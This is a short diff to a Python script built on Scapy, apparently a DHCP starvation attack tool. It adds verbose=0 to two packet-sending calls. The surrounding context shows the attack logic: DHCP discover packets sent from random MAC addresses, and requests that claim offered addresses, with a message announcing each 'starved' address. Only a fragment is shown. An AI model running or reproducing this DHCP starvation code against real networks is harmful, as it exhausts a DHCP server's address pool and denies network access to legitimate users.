@@ -61,7 +61,7 @@ class DHCPStarvation(object):
               / BOOTP(chaddr=self.rand_mac) \
               / DHCP(options=[('message-type', 'discover'), 'end'])
 
-        sendp(pkt, iface=self.iface)
+        sendp(pkt, iface=self.iface, verbose=0)
 
 
 def craft_dhcp_pkt():
@@ -109,7 +109,7 @@ def send_dhcp_req(pkt):
                     / BOOTP(chaddr=pkt[BOOTP].chaddr) \
                     / DHCP(options=[('message-type', 'request'), ('server_id', pkt[DHCP].options[SERVER_ID][ANS]), ('requested_addr', pkt[BOOTP].yiaddr),'end'])
 
-    sendp(dhcp_request, iface=IFACE)
+    sendp(dhcp_request, iface=IFACE, verbose=0)
     print(f"[*] Successfully Starved Address: {pkt[BOOTP].yiaddr}")
 
 
